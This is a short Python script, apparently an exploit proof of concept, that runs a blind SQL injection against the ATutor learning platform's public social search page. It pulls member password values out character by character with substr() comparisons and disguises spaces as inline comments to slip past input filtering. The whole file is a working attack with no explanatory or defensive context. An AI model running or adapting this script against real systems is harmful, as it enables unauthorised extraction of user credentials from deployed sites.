import requests
host = "http://xxx.xxx.xxx.xxx/"

def fuzz():
    baseList = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
    pos = 1

    # change payload
    payload = "' AND "
    payload += "(select 1 from AT_members where substr(password,$index$,1)='$character$')=1)"
    payload += "#"
    value = ""
    i = 0
    while i < len(baseList):
        tmp_payload = payload.replace("$character$",baseList[i]).replace("$index$",str(pos))
        data = {"q":tmp_payload.replace(" ","/**/")}
        r = requests.get(host+"ATutor/mods/_standard/social/index_public.php", params=data)
        resp = r.text

        if resp != "":
            pos+=1
            value += baseList[i]
            print("Found charater: %s - Current value: %s"%(baseList[i],value))
            i = 0 # reset counter
        else:
            i+=1
fuzz()
